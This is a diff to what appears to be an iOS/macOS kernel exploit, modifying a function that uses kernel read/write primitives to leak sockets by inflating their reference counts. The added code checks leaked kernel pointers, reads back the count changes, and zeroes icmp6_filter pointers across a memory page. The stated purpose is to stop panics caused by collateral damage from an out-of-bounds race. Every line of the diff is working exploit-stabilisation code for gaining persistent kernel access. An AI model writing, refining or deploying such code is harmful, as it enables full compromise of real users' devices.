@@ -860,8 +860,9 @@ void krw_sockets_leak_forever(void)
 	uint64_t rwSocketAddr = early_kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
 	printf("[i] krw: rwSocketAddr = %#llx\n", rwSocketAddr);
 
-	if (!controlSocketAddr || !rwSocketAddr) {
-		printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");
+	if (!controlSocketAddr || !rwSocketAddr ||
+	    (controlSocketAddr >> 56) != 0xff || (rwSocketAddr >> 56) != 0xff) {
+		printf("[-] Bad socket addrs: control=%#llx rw=%#llx\n", controlSocketAddr, rwSocketAddr);
 		FAILURE(0);
 	}
 
@@ -873,7 +874,22 @@ void krw_sockets_leak_forever(void)
 	early_kwrite64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT, controlSocketSoCount + 0x0000100100001001);
 	early_kwrite64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT, rwSocketSoCount + 0x0000100100001001);
 
+	// verify the bumps took effect
+	uint64_t verify_ctrl = early_kread64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT);
+	uint64_t verify_rw = early_kread64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT);
+	printf("[i] krw: verify ctrl_so_count=%#llx rw_so_count=%#llx\n", verify_ctrl, verify_rw); fflush(stdout);
+
 	early_kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
+
+	// NULL all icmp6_filter pointers on the target page to prevent zone_require
+	// panics from collateral OOB race damage. The race may write stale data to
+	// neighboring PCBs, corrupting their filter pointers. NULLing makes
+	// rip6_detach skip kfree_type (it checks: if (inp->in6p_icmp6filt)).
+	uint64_t pageBase = rwSocketPcb & ~0x3FFFULL;
+	for (int pi = 0; pi < 16; pi++) {
+		early_kwrite64(pageBase + pi * 0x400 + OFFSET_ICMP6FILT, 0);
+	}
+	printf("[i] NULLed 16 filter pointers on page %#llx\n", pageBase); fflush(stdout);
 }
 
 uint64_t kernel_base;
